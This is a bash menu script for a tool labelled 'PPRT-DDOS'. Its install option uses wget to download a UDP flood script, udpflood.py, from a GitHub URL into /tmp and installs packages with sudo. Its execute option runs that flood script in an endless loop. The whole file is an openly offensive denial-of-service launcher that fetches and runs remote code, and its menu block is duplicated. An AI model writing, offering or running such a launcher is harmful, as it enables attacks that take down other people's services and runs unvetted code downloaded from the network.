#!/bin/bash

function install_script() {
    clear
    wget -O /tmp/udpflood.py 'https://raw.githubusercontent.com/fernandesrobert/PPRT-DDOS/master/udpflood.py'
    chmod +x /tmp/udpflood.py
    sudo apt-get install epel-release -y
    sudo apt-get install snapd -y
    sudo apt-get install python38 -y
    sudo apt-get install python -y
    sudo apt-get install python38 -y
    sudo systemctl enable --now snapd.socket
    sudo ln -s /var/lib/snapd/snap /snap
    sudo apt-get -y update
    sudo apt-get -y upgrade
    sudo snap install figlet
    sudo apt-get -y install figlet
    clear
}

function execute_script() {
    clear
    while true; do
        clear
        python3 /tmp/udpflood.py
    done
    clear
}

function redo_last_execution() {
    clear
    execute_script
}

clear


# Display ASCII art banner
cat << "EOF"
 /$$$$$$$  /$$$$$$$  /$$$$$$$  /$$$$$$$$      /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
| $$__  $$| $$__  $$| $$__  $$|__  $$__/     | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$  \ $$| $$  \ $$   | $$        | $Q$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
| $$$$$$$/| $$$$$$$/| $$$$$$$/   | $$ /$$$$$$| $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
| $$____/ | $$____/ | $$__  $$   | $$|______/| $$  | $$| $$  | $$| $$  | $$ \____  $$
| $$      | $$      | $$  \ $$   | $$        | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
| $$      | $$      | $$  | $$   | $$        | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
|__/      |__/      |__/  |__/   |__/        |_______/ |_______/  \______/  \______/ 
                                                                                     
                                                                                     
EOF

echo "Select an option:"
echo "1. Install script"
echo "2. Execute script"
echo "3. Re-do last execution"

read -p "Enter your choice: " choice

case $choice in
    1) install_script ;;
    2) execute_script ;;
    3) redo_last_execution ;;
    *) echo "Invalid choice. Exiting." ;;
esac

echo "Select an option:"
echo "1. Install script"
echo "2. Execute script"
echo "3. Re-do last execution"

read -p "Enter your choice: " choice

case $choice in
    1) install_script ;;
    2) execute_script ;;
    3) redo_last_execution ;;
    *) echo "Invalid choice. Exiting." ;;
esac
